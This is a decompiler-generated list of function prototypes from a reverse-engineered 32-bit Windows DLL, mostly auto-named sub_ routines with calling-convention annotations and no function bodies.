int __cdecl sub_1000B10A(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, void *Block, int a23, int a24, int a25, unsigned int j, unsigned int i, int a28, int a29, _DWORD *a30);
int DisableOFR();
LONG sub_1000B39D();
int __stdcall sub_1000B3E1(_DWORD *a1);
int __stdcall GetWPF(int a1);
LONG sub_1000B741();
int CreatePGHDict();
LONG sub_1000B811();
int __stdcall sub_1000B855(int a1);
LONG __stdcall sub_1000BA07(int *a1);
void *__stdcall sub_1000BA57(_DWORD *a1);
int __thiscall sub_1000BA7B(int this, int a2);
int __thiscall sub_1000BAB1(int this, int a2);
_DWORD *__thiscall sub_1000BAE7(void *this, _DWORD *a2);
void *__thiscall sub_1000BB42(_DWORD *this);
BOOL __thiscall sub_1000BB6C(void *this);
_DWORD *__thiscall sub_1000BB7E(_DWORD *Block, char a2);
int __thiscall sub_1000BBB7(void *this, int a2);
_DWORD *__thiscall sub_1000BBEA(void *this, _DWORD *a2);
BOOL __thiscall sub_1000BC2B(int this);
BOOL __thiscall sub_1000BC3E(_DWORD *this);
_DWORD *__thiscall sub_1000BC48(_DWORD *this);
void __thiscall sub_1000BC76(_DWORD *this);
void __thiscall sub_1000BC7A(_DWORD *this);
void __noreturn sub_1000BC7E(); // weak
void __noreturn sub_1000BC9B(); // weak
void __thiscall sub_1000BCBF(_DWORD *this);
_DWORD *__thiscall sub_1000BCD4(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_1000BD3D(_DWORD *Block, char a2);
char *__thiscall sub_1000BD77(_DWORD *this, char a2);
_DWORD *__stdcall sub_1000BD96(_DWORD *a1);
void *__thiscall sub_1000BDE7(_DWORD *this);
bool __thiscall sub_1000BE39(_DWORD *this, _DWORD *a2);
char __thiscall sub_1000BE70(_DWORD *this, _DWORD *a2);
int __thiscall sub_1000BEBD(_DWORD *this, _DWORD *a2);
int __thiscall sub_1000BF15(_DWORD *this, _DWORD *pExceptionObject);
_DWORD *__thiscall sub_1000BF6A(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1000BFA2(_DWORD *this, _DWORD *a2);
int __thiscall sub_1000BFDA(_DWORD *this, int a2);
int __thiscall sub_1000BFF2(_DWORD *this);
int __thiscall sub_1000C006(_DWORD *this);
// _DWORD *__userpurge sub_1000C00E@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000C052(void *this);
_DWORD *__thiscall sub_1000C08B(_DWORD *Block, char a2);
// _DWORD *__userpurge sub_1000C0A7@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
// int __userpurge sub_1000C0FB@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
// void __usercall sub_1000C17C(int a1@<esi>);
_DWORD *__stdcall sub_1000C1A4(_DWORD *a1);
_DWORD *__stdcall sub_1000C1DD(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9);
void __thiscall sub_1000C261(int *this, unsigned __int8 (__thiscall ***a2)(_DWORD), int a3);
void __stdcall sub_1000C325(int a1, volatile LONG *a2);
_DWORD *__stdcall sub_1000C593(_DWORD *a1);
_DWORD *__stdcall sub_1000C5DF(_DWORD *a1);
_DWORD *__stdcall sub_1000C60E(_DWORD *a1);
// errno_t __usercall sub_1000C650@<eax>(int a1@<eax>, void *Destination, int a3, void *Source);
char *__cdecl sub_1000C66C(char *a1);
// errno_t __userpurge sub_1000C690@<eax>(int a1@<esi>, wchar_t *String);
_DWORD *__cdecl sub_1000C6F3(_DWORD *a1);
// _DWORD *__userpurge sub_1000C7A8@<eax>(int a1@<edi>, _DWORD *a2);
// errno_t __userpurge sub_1000C81A@<eax>(int a1@<esi>, wchar_t *String, wchar_t *Source);
// int __userpurge sub_1000C8A2@<eax>(int a1@<edi>, int a2);
void *__thiscall sub_1000C914(void *Block, char a2);
int __stdcall sub_1000C934(int a1, wchar_t *a2);
int __stdcall sub_1000C971(int a1, int a2);
int __stdcall sub_1000C9B1(int a1, wchar_t *a2, wchar_t *a3);
int __stdcall sub_1000C9F1(int a1, char *String, size_t MaxCount);
void __thiscall sub_1000CA99(_DWORD *this);
_DWORD *__thiscall sub_1000CAAE(_DWORD *this, _DWORD *a2, int a3);
char *__thiscall sub_1000CB15(_DWORD *this, char a2);
// void __usercall sub_1000CB37(int a1@<esi>);
void __stdcall sub_1000CBC7(int a1);
_DWORD *__stdcall sub_1000CC20(_DWORD *a1, wchar_t *a2);
// _DWORD *__userpurge sub_1000CC90@<eax>(int a1@<edi>, _DWORD *a2);
// _DWORD *__userpurge sub_1000CCE5@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
_DWORD *__thiscall sub_1000CD9F(_DWORD *this, _DWORD *a2);
_DWORD *__cdecl sub_1000CDFA(_DWORD *a1);
_DWORD *__stdcall sub_1000CE26(_DWORD *a1, int a2);
LONG __thiscall sub_1000CE59(int *this);
_DWORD *__stdcall sub_1000CE81(_DWORD *a1, char *a2);
// int __usercall sub_1000CED7@<eax>(int a1@<edi>);
_DWORD *__cdecl sub_1000CEE8(_DWORD *a1, char *a2);
char __thiscall sub_1000CF22(int *this);
// int __userpurge sub_1000CF9F@<eax>(int *a1@<esi>, int a2);
// int __userpurge sub_1000CFB9@<eax>(int a1@<ebx>, int a2);
_DWORD *__cdecl sub_1000D027(_DWORD *a1, int a2, int a3);
// bool __usercall sub_1000D097@<al>(int a1@<eax>, int a2@<ecx>);
// int __usercall sub_1000D0B5@<eax>(int a1@<eax>, int a2@<ecx>);
// int __usercall sub_1000D0D9@<eax>(int *a1@<esi>);
// size_t __usercall sub_1000D0EE@<eax>(int a1@<eax>);
// size_t __usercall sub_1000D100@<eax>(int a1@<eax>);
// int __usercall sub_1000D118@<eax>(int a1@<esi>);
// void __usercall sub_1000D184(int a1@<esi>, wchar_t *Format, ...);
_DWORD *__cdecl sub_1000D20A(_DWORD *a1, int a2);
_DWORD *__cdecl sub_1000D260(_DWORD *a1, int a2);
// _DWORD *__userpurge sub_1000D2DE@<eax>(int a1@<ecx>, unsigned int a2@<ebx>, _DWORD *a3, rsize_t MaxCount);
// int *__usercall sub_1000D3BA@<eax>(int *a1@<eax>);
// int *__usercall sub_1000D426@<eax>(int *a1@<eax>);
// int *__userpurge sub_1000D47D@<eax>(int *a1@<eax>, __int16 a2);
int __stdcall sub_1000D4FF(int a1, int pExceptionObject, int a3, unsigned int a4);
// int *__userpurge sub_1000D744@<eax>(int *a1@<eax>, int a2@<ebx>, int pExceptionObject, unsigned int a4);
// int *__usercall sub_1000D7ED@<eax>(unsigned int a1@<eax>, int *a2@<ecx>);
// BOOL __usercall sub_1000D84E@<eax>(int a1@<eax>, int a2@<ecx>);
// int __userpurge sub_1000D869@<eax>(int a1@<ecx>, int a2@<esi>, wchar_t a3);
// int __userpurge sub_1000D88B@<eax>(int a1@<esi>, wchar_t a2);
// int __userpurge sub_1000D8AA@<eax>(int a1@<eax>, int a2@<esi>, int a3);
// int __usercall sub_1000D927@<eax>(int a1@<eax>, int a2@<ecx>);
_DWORD *__thiscall sub_1000D938(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1000D98B(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1000D9DE(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1000DA39(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1000DA94(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_1000DB09(void *this, _DWORD *a2, unsigned int pExceptionObject);
void __thiscall sub_1000DB7E(_DWORD *this);
int __thiscall sub_1000DBA3(void *this, int a2);
int *__thiscall sub_1000DBD1(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1000DC39(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1000DCA1(void *this, int a2);
void __thiscall sub_1000DCD9(void *this, int a2, int a3);
void __thiscall sub_1000DD14(void *this, int a2);
int __thiscall sub_1000DD4C(void *this, int a2);
int __thiscall sub_1000DD88(void *this, int a2);
void __thiscall sub_1000DDC4(void *this);
// int __usercall sub_1000DE18@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_1000DE49(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000DE68(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000DE88(_DWORD *Block, char a2);
// int __usercall sub_1000DEAD@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_1000DEED(void *this, _DWORD *a2, int a3);
void __thiscall sub_1000DF21(_DWORD *this);
bool __thiscall sub_1000DF46(int this);
BOOL __thiscall sub_1000DF5D(_DWORD *this);
int __thiscall sub_1000DF67(int this);
int __thiscall sub_1000DFA2(int this);
int __thiscall sub_1000DFD8(_DWORD *this);
int __thiscall sub_1000E000(int this);
int __thiscall sub_1000E03B(int this, int a2);
_DWORD *__thiscall sub_1000E057(void *this, _DWORD *a2, int a3);
void __thiscall sub_1000E08B(_DWORD *this);
bool __thiscall sub_1000E0B0(int this);
BOOL __thiscall sub_1000E0C7(_DWORD *this);
int __thiscall sub_1000E0D1(int this);
int __thiscall sub_1000E10C(int this);
int __thiscall sub_1000E142(_DWORD *this);
int __thiscall sub_1000E16A(int this);
int __thiscall sub_1000E1A5(int this, int a2);
_DWORD *__thiscall sub_1000E1C1(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000E1E0(_DWORD *Block, char a2);
LONG __stdcall sub_1000E23A(int *a1);
_DWORD *__stdcall sub_1000E274(_DWORD *a1);
void **__thiscall sub_1000E2A6(void **this, void **a2);
void __thiscall sub_1000E2E8(int this);
int __thiscall sub_1000E337(_DWORD *this);
int __thiscall sub_1000E33B(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_1000E398(int *this, int a2);
int __thiscall sub_1000E3B3(_DWORD *this, unsigned int a2);
int __thiscall sub_1000E3FF(_DWORD *this, int a2);
int __thiscall sub_1000E420(_DWORD *this, int a2);
void __thiscall sub_1000E441(_DWORD *this, unsigned int a2);
int __thiscall sub_1000E466(void **this);
BOOL __thiscall sub_1000E48A(void *this);
int __thiscall sub_1000E495(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1000E4D7(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_1000E549(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_1000E571(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_1000E584(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1000E5E2(_DWORD *this);
// _DWORD *__userpurge sub_1000E6AC@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000E6EB(void *this);
// _DWORD *__userpurge sub_1000E730@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000E76F(void *this);
void *__thiscall sub_1000E7A0(void *Block, char a2);
_DWORD *__stdcall sub_1000E7BF(_DWORD *a1);
// void *__usercall sub_1000E7EA@<eax>(_DWORD *a1@<esi>);
// void __usercall sub_1000E81F(int a1@<esi>);
// void __usercall sub_1000E859(int a1@<esi>);
// unsigned int __usercall sub_1000E895@<eax>(int a1@<eax>);
void __cdecl sub_1000E8D4(int a1, unsigned int a2);
int __cdecl sub_1000E8F9(int a1);
int __cdecl sub_1000E943(int a1);
_DWORD *__stdcall sub_1000E98B(_DWORD *a1, void *a2, char a3);
int *__thiscall sub_1000E9C2(int *Block, char a2);
_DWORD *__stdcall sub_1000E9E2(_DWORD *a1, void *a2, char a3);
int *__thiscall sub_1000EA15(int *Block, char a2);
LONG __thiscall sub_1000EA34(int *this);
DWORD __thiscall sub_1000EA59(_DWORD *this);
char __thiscall sub_1000EA95(_DWORD *this, DWORD dwExitCode);
int __stdcall sub_1000EAE2(int a1, void *pExceptionObject);
int __thiscall sub_1000EB8F(_DWORD *this);
bool __thiscall sub_1000EBB2(_DWORD *this);
_DWORD *__thiscall sub_1000EBEC(void *this, _DWORD *a2, DWORD a3);
DWORD __thiscall sub_1000EC2C(_DWORD *this);
// _DWORD *__usercall sub_1000EC5D@<eax>(DWORD a1@<ebx>, _DWORD *a2, DWORD dwDesiredAccess);
// _DWORD *__userpurge sub_1000ECB8@<eax>(int a1@<edi>, _DWORD *a2);
// _DWORD *__userpurge sub_1000ECE5@<eax>(int a1@<edi>, _DWORD *a2);
_DWORD *__stdcall sub_1000ED19(_DWORD *a1, int a2);
int *__thiscall sub_1000ED4C(int *Block, char a2);
_DWORD *__thiscall sub_1000ED6B(_DWORD *this, _DWORD *a2, char a3, DWORD DesiredAccess);
LONG __stdcall sub_1000EDE9(int *a1);
// LONG __usercall sub_1000EE1D@<eax>(int *a1@<esi>);
_DWORD *__stdcall sub_1000EE6C(_DWORD *a1);
void *__stdcall sub_1000EE98(_DWORD *a1);
// void *__usercall sub_1000EEB8@<eax>(int a1@<esi>);
_DWORD *__stdcall sub_1000EF17(_DWORD *a1);
_DWORD *__stdcall sub_1000EF4E(_DWORD *a1);
void sub_1000EFCA();
LONG __stdcall sub_1000EFF0(int *a1);
int *__thiscall sub_1000F03E(int *Block, char a2);
LONG __stdcall sub_1000F05E(int *a1);
int __stdcall sub_1000F08C(int a1);
char sub_1000F0BC();
bool sub_1000F28E();
// bool __usercall sub_1000F312@<al>(int a1@<edi>);
void __thiscall sub_1000F40C(_DWORD *this);
int *__thiscall sub_1000F431(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1000F499(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1000F501(void *this, int a2);
void __thiscall sub_1000F539(void *this, int a2, int a3);
void __thiscall sub_1000F574(void *this, int a2);
int __thiscall sub_1000F5AC(void *this, int a2);
int __thiscall sub_1000F5E8(void *this, int a2);
void __thiscall sub_1000F624(void *this);
_DWORD *__stdcall sub_1000F673(_DWORD *a1);
void __thiscall sub_1000F6AA(_DWORD *this);
void *__thiscall sub_1000F701(void *this, int a2);
void *__thiscall sub_1000F716(void *this, int a2);
int __thiscall sub_1000F72B(_DWORD *this);
_DWORD *__thiscall sub_1000F72F(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1000F785(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1000F7DB(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1000F831(int *this, _DWORD *a2);
int *__thiscall sub_1000F887(void *this);
_DWORD *__thiscall sub_1000F8BE(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000F8DD(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000F8FD(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000F91D(_DWORD *Block, char a2);
int *__stdcall sub_1000F93C(int *Block);
void *__thiscall sub_1000F957(void *Block, char a2);
int *__stdcall sub_1000F976(int *Block);
LONG __stdcall sub_1000F991(int *a1);
_DWORD *__stdcall sub_1000F9B1(_DWORD *a1);
// int __usercall sub_1000F9E1@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_1000FA25@<eax>(int a1@<ecx>, int a2@<esi>);
// void __usercall sub_1000FA56(int a1@<ecx>, int a2@<edi>);
_DWORD *__thiscall sub_1000FAB2(void *this, _DWORD *a2, int a3, int a4);
void __thiscall sub_1000FAEC(_DWORD *this);
BOOL __thiscall sub_1000FB11(_DWORD *this);
BOOL __thiscall sub_1000FB1A(_DWORD *this);
int __thiscall sub_1000FB23(_DWORD *this);
int __thiscall sub_1000FB47(_DWORD *this);
int __thiscall sub_1000FB74(_DWORD *this);
int *__thiscall sub_1000FBA1(int this);
_DWORD *__thiscall sub_1000FC17(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1000FC9C(void *this, _DWORD *a2, int a3, int a4);
void __thiscall sub_1000FCD6(_DWORD *this);
BOOL __thiscall sub_1000FCFB(_DWORD *this);
BOOL __thiscall sub_1000FD04(_DWORD *this);
int __thiscall sub_1000FD0D(_DWORD *this);
int __thiscall sub_1000FD31(_DWORD *this);
int __thiscall sub_1000FD5E(_DWORD *this);
int *__thiscall sub_1000FD8B(int this);
_DWORD *__thiscall sub_1000FE01(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1000FE86(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000FEA5(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1000FEF3(_DWORD *Block, char a2);
int *__thiscall sub_1000FF12(int *Block, char a2);
// _DWORD *__userpurge sub_1000FF31@<eax>(int a1@<edi>, _DWORD *a2);
int *__thiscall sub_1000FF5E(int *Block, char a2);
_DWORD *__stdcall sub_1000FF94(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9);
void __thiscall sub_1000FFF2(void *this);
// int __userpurge sub_1001001D@<eax>(__int32 a1@<eax>, int a2);
// _DWORD *__userpurge sub_10010046@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10010085(void *this);
// _DWORD *__userpurge sub_100100CA@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10010109(void *this);
// void __usercall sub_1001014C(int a1@<esi>);
// int __usercall sub_10010174@<eax>(__int32 a1@<eax>);
// void __usercall sub_100101FD(int a1@<esi>);
// void __usercall sub_10010237(int a1@<esi>);
_DWORD *__stdcall sub_1001029F(_DWORD *a1, int a2, int a3);
int *__thiscall sub_100102E2(int *Block, char a2);
LONG __thiscall sub_10010301(int *this);
char __thiscall sub_10010334(_DWORD **this);
// int __usercall sub_10010428@<eax>(int a1@<esi>);
_DWORD *__thiscall sub_10010447(_DWORD *Block, char a2);
void (__cdecl *__thiscall sub_10010466(_DWORD *this))(unsigned int, struct _EXCEPTION_POINTERS *);
// void (__cdecl *__usercall sub_10010497@<eax>(int a1@<esi>))(unsigned int, struct _EXCEPTION_POINTERS *);
void __cdecl __noreturn sub_100104AB(int a1, int **a2);
_DWORD *__thiscall sub_100104CF(_DWORD *this, int a2);
_DWORD *__thiscall sub_10010507(_DWORD *Block, char a2);
// _DWORD *__usercall sub_10010526@<eax>(_DWORD *a1@<esi>);
_DWORD *__thiscall sub_1001053D(_DWORD *Block, char a2);
UINT __thiscall sub_1001055C(_DWORD *this);
int __stdcall sub_1001058F(int a1, int a2, _DWORD *a3, int a4, int a5, int a6, volatile LONG *lpAddend);
HANDLE *__thiscall sub_10010614(HANDLE *Block, char a2);
int __stdcall sub_10010633(int a1, int a2, _DWORD *a3, int a4, volatile LONG *lpAddend);
// int __userpurge sub_100106B7@<eax>(int a1@<edi>, int a2, int a3, int a4, volatile LONG *lpAddend);
int __thiscall sub_10010721(int this, int a2);
LONG __thiscall sub_10010768(HANDLE *this);
LONG __thiscall sub_100107AA(void *this);
void __thiscall sub_10010985(_DWORD *this);
_DWORD *__thiscall sub_10010998(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_10010A0E(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_10010A9E(_DWORD *this, int a2, int a3);
char *__thiscall sub_10010AFF(_DWORD *this, char a2);
char *__thiscall sub_10010B21(_DWORD *this, char a2);
char *__thiscall sub_10010B43(_DWORD *this, char a2);
void __thiscall sub_10010B65(_DWORD *this);
void __thiscall sub_10010B78(_DWORD *this);
int __thiscall sub_10010B8D(HANDLE *this);
int __thiscall sub_10010B9D(HANDLE *this, const FILETIME *a2, int a3);
int __thiscall sub_10010BE7(HANDLE *this, const FILETIME *a2, int a3);
int __thiscall sub_10010C31(_DWORD *this);
BOOL __thiscall sub_10010C66(_DWORD *this);
int __thiscall sub_10010C75(void *this, char a2);
int __thiscall sub_10010C8F(HANDLE *this, _DWORD *a2);
int __thiscall sub_10010CA9(HANDLE *this);
_DWORD *__stdcall sub_10010CE9(_DWORD *a1, int a2);
_DWORD *__thiscall sub_10010D1C(_DWORD *Block, char a2);
void __thiscall sub_10010D3B(_DWORD *this);
int __stdcall sub_10010D5F(int *a1);
_DWORD *__stdcall sub_10010DEC(int *a1, _DWORD *a2);
void __thiscall sub_10010E29(int *this, char a2, int a3);
_DWORD *__stdcall sub_10010F0C(_DWORD *a1);
void __thiscall sub_10010F43(_DWORD *this);
void *__thiscall sub_10010F9A(void *this, int a2);
void *__thiscall sub_10010FAF(void *this, int a2);
int __thiscall sub_10010FC4(_DWORD *this);
_DWORD *__thiscall sub_10010FC8(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1001101E(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10011074(int *this, _DWORD *a2);
_DWORD *__thiscall sub_100110CA(int *this, _DWORD *a2);
void __thiscall sub_10011120(_DWORD *this);
int *__thiscall sub_10011145(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_100111AD(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_10011215(void *this, int a2, int a3);
void __thiscall sub_10011250(void *this, int a2);
int __thiscall sub_10011288(void *this, int a2);
int __thiscall sub_100112C4(void *this, int a2);
void __thiscall sub_10011300(void *this);
// int __usercall sub_1001134D@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_10011385(_DWORD *Block, char a2);
void *__stdcall sub_100113A4(void *Block);
_DWORD *__thiscall sub_100113BF(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100113DE(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100113FE(_DWORD *Block, char a2);
void __stdcall sub_1001141E(void *a1);
// void __usercall sub_1001143E(int a1@<ecx>, int a2@<edi>);
_DWORD *__stdcall sub_1001149A(_DWORD *a1);
// int __usercall sub_100114CF@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_10011500(void *this, _DWORD *a2, int a3, int a4);
void __thiscall sub_1001153A(_DWORD *this);
BOOL __thiscall sub_1001155F(_DWORD *this);
BOOL __thiscall sub_10011568(_DWORD *this);
int __thiscall sub_10011571(_DWORD *this);
int __thiscall sub_10011595(_DWORD *this);
int __thiscall sub_100115C2(_DWORD *this);
void *__thiscall sub_100115EF(int this);
_DWORD *__thiscall sub_10011665(_DWORD *this, int *a2);
_DWORD *__thiscall sub_100116F4(void *this, _DWORD *a2, int a3, int a4);
void __thiscall sub_1001172E(_DWORD *this);
BOOL __thiscall sub_10011753(_DWORD *this);
BOOL __thiscall sub_1001175C(_DWORD *this);
int __thiscall sub_10011765(_DWORD *this);
int __thiscall sub_10011789(_DWORD *this);
int __thiscall sub_100117B6(_DWORD *this);
void *__thiscall sub_100117E3(int this);
_DWORD *__thiscall sub_10011859(_DWORD *this, int *a2);
_DWORD *__thiscall sub_100118E8(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10011907(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1001193B(_DWORD *a1, int a2, volatile LONG *lpAddend, int a4, int a5);
// _DWORD *__userpurge sub_100119A2@<eax>(_DWORD *a1@<esi>, int a2);
// _DWORD *__userpurge sub_10011A0F@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10011A4E(void *this);
// void __usercall sub_10011AB5(int a1@<esi>);
// _DWORD *__userpurge sub_10011AFB@<eax>(int a1@<ebx>, int a2@<edi>, _DWORD *a3, int a4, int a5, int a6, int a7, volatile LONG *lpAddend);
void *__thiscall sub_10011BBC(void *Block, char a2);
// _DWORD *__userpurge sub_10011BDB@<eax>(_DWORD *a1@<edi>, _DWORD *a2);
LONG __thiscall sub_10011C44(int this);
char __thiscall sub_10011CA3(_DWORD *this);
void __thiscall sub_10011D6E(_DWORD *this);
_DWORD *__thiscall sub_10011D81(_DWORD *this, _DWORD *a2, int a3);
char *__thiscall sub_10011DF7(_DWORD *this, char a2);
int __thiscall sub_10011E19(HANDLE *this);
BOOL __thiscall sub_10011E59(_DWORD *this);
int __thiscall sub_10011E63(_DWORD *this);
char *__thiscall sub_10011E67(char *this);
int *__thiscall sub_10011E6B(_DWORD *this, int *a2);
int __thiscall sub_10011F17(_DWORD *this);
_DWORD *__thiscall sub_10011F1B(_DWORD *this, _DWORD *a2);
int __thiscall sub_10011F57(_DWORD *this);
int __thiscall sub_10011F5B(_DWORD *this);
int __thiscall sub_10011F5F(_DWORD *this);
// int __userpurge sub_10011F63@<eax>(HANDLE *a1@<esi>, FILETIME *lpCreationTime, FILETIME *lpLastAccessTime, FILETIME *lpLastWriteTime);
_QWORD *__thiscall sub_10011FC5(HANDLE *this, _QWORD *a2, int a3);
int __thiscall sub_10012006(HANDLE *this, const FILETIME *a2, int a3);
_QWORD *__thiscall sub_10012058(HANDLE *this, _QWORD *a2, int a3);
int __thiscall sub_1001209B(HANDLE *this, const FILETIME *a2, int a3);
_QWORD *__thiscall sub_100120EB(HANDLE *this, _QWORD *a2, int a3);
int __thiscall sub_1001212C(HANDLE *this, const FILETIME *a2, int a3);
DWORD __thiscall sub_1001217E(HANDLE *this);
BOOL __thiscall sub_1001224D(void *this, DWORD dwFileAttributes);
DWORD __thiscall sub_100122A1(HANDLE *this);
// BOOL __userpurge sub_10012362@<eax>(struct _FILETIME *a1@<ebx>, struct _FILETIME *a2@<edi>, HANDLE *a3@<esi>, struct _FILETIME *a4);
// struct _FILETIME __usercall sub_10012454@<edx:eax>(const FILETIME *a1@<eax>, int a2, int a3);
__int16 __thiscall sub_100124C3(void *this);
DWORD __thiscall sub_10012521(HANDLE *this, _DWORD *NumberOfBytesRead);
void __thiscall sub_100125B3(_DWORD *this);
_DWORD *__thiscall sub_100125C6(_DWORD *this, _DWORD *a2, int a3);
char *__thiscall sub_1001263C(_DWORD *this, char a2);
LONG __thiscall sub_1001265E(void *this, char a2);
int __thiscall sub_1001269F(HANDLE *this, _DWORD *NumberOfBytesWritten);
DWORD __thiscall sub_10012712(HANDLE *this, LONG lDistanceToMove, DWORD dwMoveMethod);
void __thiscall sub_10012782(_DWORD *this);
_DWORD *__thiscall sub_10012795(_DWORD *this, _DWORD *a2, int a3);
char *__thiscall sub_1001280B(_DWORD *this, char a2);
DWORD __thiscall sub_1001282D(HANDLE *this);
BOOL __thiscall sub_1001287F(HANDLE *this);
BOOL __thiscall sub_100128CA(HANDLE *this);
void __thiscall __noreturn sub_10012915(void *this);
// _DWORD *__usercall sub_10012981@<eax>(_DWORD *a1@<esi>);
int (__cdecl **__thiscall sub_100129A3(int (__cdecl **Block)(unsigned int), char a2))(unsigned int);
int __thiscall sub_100129C2(int (__cdecl **this)(unsigned int));
_DWORD *__stdcall sub_10012A00(_DWORD *a1, wchar_t *a2);
int *__thiscall sub_10012A30(int *Block, char a2);
// _DWORD *__userpurge sub_10012A4F@<eax>(int a1@<edi>, _DWORD *a2);
_DWORD *__stdcall sub_10012A7C(_DWORD *a1, int a2);
LONG __thiscall sub_10012AAC(int *this);
_DWORD *__stdcall sub_10012AD0(_DWORD *a1, int a2, int a3);
LONG __thiscall sub_10012B36(int *this);
int *__thiscall sub_10012B88(int *Block, char a2);
// int __usercall sub_10012BA7@<eax>(int a1@<ebx>);
_DWORD *__stdcall sub_10012DD3(_DWORD *a1);
void __thiscall sub_10012E01(_DWORD *this);
_DWORD *__thiscall sub_10012E25(_DWORD *Block, char a2);
BOOL __stdcall sub_10012E44(int a1);
_DWORD *__stdcall sub_10012E5A(_DWORD *a1);
_DWORD *__thiscall sub_10012E88(_DWORD *Block, char a2);
void __thiscall sub_10012EA7(_DWORD *this);
int __stdcall sub_10012ECB(int a1, int a2, int a3, int a4, int a5, _DWORD *a6, _DWORD *a7, void *Block);
void *__thiscall sub_1001310B(void *Block, char a2);
void __stdcall sub_1001312A(int a1);
LONG __thiscall sub_1001314D(int this);
void __stdcall sub_10013219(_DWORD *a1);
_DWORD *__stdcall sub_10013290(int a1, _DWORD *a2);
// int sub_10013521(void); weak
int __cdecl sub_10013547(void (__stdcall *a1)(int), int a2);
_DWORD *__thiscall sub_100135A3(_DWORD *this, _DWORD *a2);
int __stdcall sub_1001365C(int a1);
_DWORD *__stdcall sub_10013681(_DWORD *a1, _DWORD *a2);
_DWORD *__thiscall sub_1001371A(_DWORD *Block, char a2);
// int *__usercall sub_10013739@<eax>(int *a1@<eax>, int *a2@<edi>);
// _DWORD *__usercall sub_10013770@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_100137AB(void *this);
// _DWORD *__userpurge sub_100137D6@<eax>(int a1@<edi>, _DWORD *a2);
// _DWORD *__usercall sub_100137E8@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
// _DWORD *__usercall sub_10013813@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_1001384E(void *this);
// _DWORD *__usercall sub_10013891@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_100138CC(void *this);
// _DWORD *__userpurge sub_100138F7@<eax>(int a1@<edi>, _DWORD *a2);
// void __usercall sub_1001390F(_DWORD *a1@<ecx>, int a2@<edi>);
// void __usercall sub_10013964(int a1@<esi>);
// void __usercall sub_1001398C(_DWORD *a1@<ecx>, int a2@<edi>);
// void __usercall sub_100139CF(int a1@<esi>);
// void __usercall sub_100139F7(_DWORD *a1@<ecx>, int a2@<edi>);
// void __usercall sub_10013A3A(int a1@<esi>);
int __thiscall sub_10013A6C(_DWORD *this, int a2, void *Block, int a4, int a5, int a6, int a7, volatile LONG *lpAddend);
int __thiscall sub_10013C13(int this);
int __thiscall sub_10013C3A(int this);
int __thiscall sub_10013C61(int this);
unsigned int __thiscall sub_10013C8D(_BYTE *this);
int __thiscall sub_10013CD1(int this);
int __thiscall sub_10013CFD(int this, unsigned int a2);
char __thiscall sub_10013D58(_BYTE *this);
int __thiscall sub_10013D5C(int *this, volatile LONG *a2);
DWORD __thiscall sub_10013E0E(int this);
// void __usercall sub_10013E27(int a1@<esi>);
int *__thiscall sub_10013EE0(void *this, int *a2);
int *__cdecl sub_10013F14(int *a1, int a2);
// void __usercall sub_10013F72(_DWORD *a1@<ecx>, int a2@<edi>);
